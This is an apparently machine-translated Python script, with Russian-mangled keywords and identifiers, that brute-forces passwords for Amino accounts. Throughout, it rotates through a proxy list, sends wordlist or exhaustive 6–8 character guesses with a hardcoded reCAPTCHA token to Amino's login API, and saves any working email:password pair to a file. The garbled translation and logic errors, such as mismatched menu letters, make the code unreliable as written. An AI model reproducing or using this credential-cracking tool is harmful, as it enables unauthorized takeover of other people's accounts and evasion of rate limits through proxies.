запросы на импорт
импортная резьба
 время импорта
импорт случайный
импорт sys
импорт строки
импорт ОС
импорт pyfiglet
импорт colorama
#Текст в 3D-шрифте
out = pyfiglet.figlet_format("N. V. E", font="slant")
попробуйте: from colorama import Fore, Back, Style
except: print('Не установлена "colorama" через pip ...'); exit()
colorama.init()
сессия = запросы.сессия()
os.system("очистить")

попробуй:
    прокси = открыть('proxies.txt','r')
    print('[n.v.e] -- > Используем прокси \'proxies.txt\'')
за исключением:
    print('[Критическая ошибка] -- > Файл с прокси не найден \'proxies.txt\'!')
    выход()

попробуй:
    word_list = открыть('words.txt','r')
    print('[n.v.e] -- > Используем словарь \'words.txt\'')
за исключением:
    print('[Критическая ошибка] -- > Не найден словарь \'words.txt\'!')
    выход()



# Подсчитайте, сколько слов есть в файле words
words_collection = word_list.readlines()
length_wordList = len(коллекция слов)
print('[n.v.e] -- > Найдено %s слов в словаре'%str(length_wordList))

# Подсчитайте, сколько прокси есть в файле proxy
proxy_collection = proxies.readlines()
length_proxies = len(proxy_collection)
print('[n.v.e] -- > Найдено %s прокси в списке'%str(length_proxies))

глобальный дом электронной почты
глобальный authType
print(Fore.GREEN+out+Style.DIM)
печать("--------------------------------------------------------------------------------------")
authTypeTest = input('Что используем?\nИспользуй \'e\' для почты и \'p\' для номера\nВыбирай: ')
if authTypeTest.lower() == 's':
    nameEmailOrPhoneNumber = 'Почта'
    authType = 'электронная почта'
elif authTypeTest.lower() = = 'w':
    nameEmailOrPhoneNumber = 'Номер'
    authType = 'номер телефона'
остальное:
    print('Неверный ввод ...')
    выход()
emailToUse = "

печать('-- > n.v.e >< --')
хотя и правда:
    emailToUse = input('['+str(nameEmailOrPhoneNumber)+'] :: ')
    если len(emailToUse.replace('',")) == 0:
        print('[Ошибка ввода] -- > выбранная почта /номер не соответсвует канону!')
    остальное:
        print('[post-11x] -- > Выбранная почта / номер будет использовать \'%s\''%str(emailToUse))
        перерыв

print('\n[n.v.e] -- > Начинаем проверку прокси')
времясна(1)

os.system("очистить")

глобальная final_proxyCollection
final_proxyCollection = []

глобальные тупики
глобальная живипроксия

глобальный lastProxyThread

lastProxyThread = "

deadProxies = 0
aliveProxies = 0

def proxyTestScreen():
    ясно()
    print('Активный поток: ' + str(threading.active_count()))
    print('Последний поток прокси: ' + str(globals()['lastProxyThread']))
    print('Живых прокси: ' + str(globals()['aliveProxies']))
    print('Мертвых прокси: ' + str(globals()['deadProxies']))


def testProxy (прокси):
    proxy = proxy.replace('\n',")
    _testProxy = {'http':str('http://'+str(прокси)),'https':str('http://'+str(прокси))}
    попробуй:
        запросы.get('http://www.google.com',прокси=_testProxy,timeout=2.5)
        print('Найдено живое прокси: ' + str(proxy))
        globals() ['aliveProxies'] += 1
        final_proxyCollection.append(прокси)
        return {'proxy':proxy,'status':'alive'}
    за исключением:
        print('Найдено мертвое прокси: ' +str(proxy))
        globals() ['deadProxies'] += 1
        return {'proxy':proxy,'status':'dead'}


print('Проверка списка прокси листа ('+str(length_proxies)+' прокси) ...')

# Прокси-Тесты :
# --> Проверяет, не мертвы ли какие-либо прокси-серверы в списке прокси-серверов
# --> Если это так, то они не будут добавлены в окончательный список
ivari = 0
для прокси в proxy_collection:
    proxy = proxy.replace('\n',") # удалить символ новой строки из имени прокси-сервера (патч для предыдущего выпуска)
    lastProxyThread = str(прокси)
    vars() ['t'+str(ivari)] = threading.Thread(target=testProxy,args=(прокси,))
    vars()['t'+str(ivari)].начать()
    ivari += 1
    time.sleep(.025)

vars()['t'+str(ivari-1)].присоединяйтесь()


времядля сна(5)
print('\n\nПрокси проверено\n'+'-'*len('Прокси проверено'))
print('[Живые прокси] :: ' + str(aliveProxies))
print('[Мертвые прокси] :: ' + str(deadProxies))

если aliveProxies <= 2:
    если живы люди> > 0:
        print('[Внимание] -- > Число живых прокси (%s) очень мало!\n Добавьте больше прокси для стабильной работы!')

если aliveProxies <= 0:
    os.system("очистить")
    print('[Ошибка] --> Ни одно из прокси в листе не работает!\nСоветы:\n - Проверьте интернет, работает ли он\n - Есть ли у вас какие-либо прокси в листе?\n - Заблокированы ли прокси-серверы брандмауэром?\n - правильно ли отформатированы и живы прокси-серверы? Пожалуйста, убедитесь, что вы пройдете через описанные выше шаги, прежде чем пробовать что-либо еще.')
    выход()

пока это правда:
    try: method = int(input('Метод (0 = из листа. 1 = всё подряд): ')); break
    except: print('Выбранный метод некорректен...')

print('Нажмите ENTER для начала брутфорса ...')
входная информация()
времясна(1)
os.system("очистить")


#print(words_collection)

correctPassword = []

def amino_pass(прокси, пароль,электронная почта):
    _testProxy = {'http':str('http://'+str(прокси)),'https':str('http://'+str(прокси))}
    recaptcha_version = 'v3'
    recaptcha_challenge = "03AOLTBLTAc9t-dPiTwwy6Oq2PvB0jIa-HAQjbo3Q6Grjm89PyR7SLSuDupcW1GME8mcz5knxjhhbnrfo_dwp6f7lmngueyecdnfwm3i0kp9eiwcqsfalqw_soudlz47wtqxc35r-ufNsMijK6Kxt8AyMElk9VKM-DMWcr6Q6nwc2vACeumYh7QaC80CpTDcCcqngc8fd5orwgjjiz_gnvydku2feodhnkrhf6-enRfKPOgakANIuouV2zM3iT3rhvTe_cYrs1sfb_ppbyzrwke4p7_nnsop4sbfqoz8xhrigbwe3d3uz2ympvbaisy0sjkivop2hk65kwxjv2-jHVkMWUsmVYSP9dtCkpaMWAZPLD-o27XWb8TfG3mq2bHccimA4v_KkObv0Dqtr9xrmjacxscybskqms2bine9j5gfyqw5y7l_ghlxbnciaaavznu-NKttDglIVyKt0vKOTltwn73S-y8HM4fGKryaiX9jzvOBa5v57N3xXwwEWloupyw50v1y_ogum6"
    _jsonData = {'recaptcha_challenge':recaptcha_challenge,'recaptcha_version':recaptcha_version,'auth_type':0,'secret':password,authType:email}
    попробуй:
        хотя и правда:
            попробуй:
                #print('Attempt password try..')
                rQ = requests.post('https://aminoapps.com/api/auth',json=_jsonData,прокси=_testProxy,тайм-аут=2.5)
                перерыв
            за исключением:
                #print(final_proxyCollection)
                #print('[Proxy Error] -- > время ожидания прокси-сервера истекло или не удалось подключиться, поток будет перезапущен с помощью другого прокси-сервера !'%str(proxy))
                proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                _testProxy = {'http':str('http://'+str(прокси)),'https':str('http://'+str(прокси))}
    за исключением:
        #print('[Proxy Error] -- > прокси \ ' %s\' истекло время ожидания или не удалось подключиться, и этот цикл исключений был вызван (-1 :: Внутренняя ошибка)! ' %str(proxy))
        return False

    попробуй:
        rQ.json()['результат']
    за исключением:
        #print(rQ.json())
        print('[n.v.e] -- > Пароль не равен \'%s\''%str(password) + '!')

        return False

    #print(rQ.json()['result'])

    если 'nickname' в rQ.json() ['result']:
        print('Пароль верен!')
        passwordFound = открыть('password_result.txt',' w+')
        passwordFound.write(str(str(email)+':'+str(password)))
        парольнайден .закрыть()
        print('PASSWORD =' + str(пароль))
        выходим()
        return True
    elif 'title' В rQ.json()['result']:
        print('\n'+'-'*32+'Пароль найден!\nПароль: ' + str(password)+'\nСсылка на проверку: ' +str(rQ.json()['result']['url'])+'\n'+'-'*32)
        ОС.прервать()
    остальное:
        print('[n.v.e] -- > Пароль не равен \'%s\''%str(password) + '!')
        return False

если метод = = 0:
    для word in words_collection:
        print('Пробую этот пароль: ' +str(word).replace('\n',''))
        word = str(word).replace('\n',")
        proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
        x = threading.Thread(target=amino_pass,args=(proxy,word,emailToUse,))

        x.начало работы()
        времясна(0,075)
    времядля сна(10)
    x.присоединяйтесь()
остальное:

    print('Попытка взлома пароля длинной 6 символов...')

    для y в диапазоне(0,len(list(string.printable))-1):
        для z в диапазоне(0,len(list(string.printable))-1):
            для i в диапазоне(0,len(list(string.printable))-1):
                для n в диапазоне(0,len(list(string.printable))-1):
                    for ii in range(0,len(list(string.printable))-1):
                        для yy в диапазоне(0,len(list(string.printable))-1):
                            proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                            печать('Попытка ввести пароль: '+ул(список(строку.печати)[м]+список(строку.печати)[Зи]+список(строку.печати)[Я]+список(строку.печати)[Н])+список(строку.печати)[второй]+список(строку.печати)[ый])
                            х = резьбы.Резьба(целевой=amino_pass,параметр args=(доверенности,ул.(список(строку.печати)[м]+список(строку.печати)[Зи]+список(строку.печати)[Я]+список(строку.печати)[Н]+список(строку.печати)[второй]+список(строку.печати)[ый]),emailToUse,))

                            x.начало работы()
                            перерыв
                        времясна(1)
                    времядля сна(2)
                времядля сна(2)
            времядля сна(2)
        времядля сна(2)

    print('Попытка взлома пароля длинной 7 символов...')

    для y в диапазоне(0,len(list(string.printable))-1):
        для z в диапазоне(0,len(list(string.printable))-1):
            для i в диапазоне(0,len(list(string.printable))-1):
                для n в диапазоне(0,len(list(string.printable))-1):
                    for ii in range(0,len(list(string.printable))-1):
                        для yy в диапазоне(0,len(list(string.printable))-1):
                            для zz в диапазоне(0,len(list(string.printable))-1):
                                proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                                печать('Попытка ввести пароль: '+ул(список(строку.печати)[м]+список(строку.печати)[Зи]+список(строку.печати)[Я]+список(строку.печати)[Н])+список(строку.печати)[второй]+список(строку.печати)[ый]+список(строку.печати)[ЗЗ])
                                х = резьбы.Резьба(целевой=amino_pass,параметр args=(доверенности,ул.(список(строку.печати)[м]+список(строку.печати)[Зи]+список(строку.печати)[Я]+список(строку.печати)[Н]+список(строку.печати)[второй]+список(строку.печати)[ый]+список(строку.печати)[ЗЗ]),emailToUse,))

                                x.начало работы()
                                перерыв
                            времясна(1)
                        времясна(2)
                    времясна(2)
                времясна(2)
            времясна(2)
        времясна(2)

    print('Попытка взлома пароля длинной 8 символой...')

    для y в диапазоне(0,len(list(string.printable))-1):
        для z в диапазоне(0,len(list(string.printable))-1):
            для i в диапазоне(0,len(list(string.printable))-1):
                для n в диапазоне(0,len(list(string.printable))-1):
                    для ii в диапазоне(0,len(list(string.printable))-1):
                        для yy в диапазоне(0,len(list(string.printable))-1):
                            для zz в диапазоне(0,len(list(string.printable))-1):
                                для bb в диапазоне(0,len(list(string.printable))-1):
                                    proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                                    печать('Попытка ввести пароль: '+ул(список(строку.печати)[м]+список(строку.печати)[Зи]+список(строку.печати)[Я]+список(строку.печати)[Н])+список(строку.печати)[второй]+список(строку.печати)[ый]+список(строку.печати)[ЗЗ]+список(строку.печати)[ВВ])
                                    х = резьбы.Резьба(целевой=amino_pass,параметр args=(доверенности,ул.(список(строку.печати)[м]+список(строку.печати)[Зи]+список(строку.печати)[Я]+список(строку.печати)[Н]+список(строку.печати)[второй]+список(строку.печати)[ый]+список(строку.печати)[ЗЗ]+список(строку.печати)[ВВ]),emailToUse,))

                                    x.начало работы()
                                    перерыв
                                времясна(1)
                            времясна(2)
                        времясна(2)
                    времясна(2)
                времясна(2)
            времясна(2)
        времясна(2)
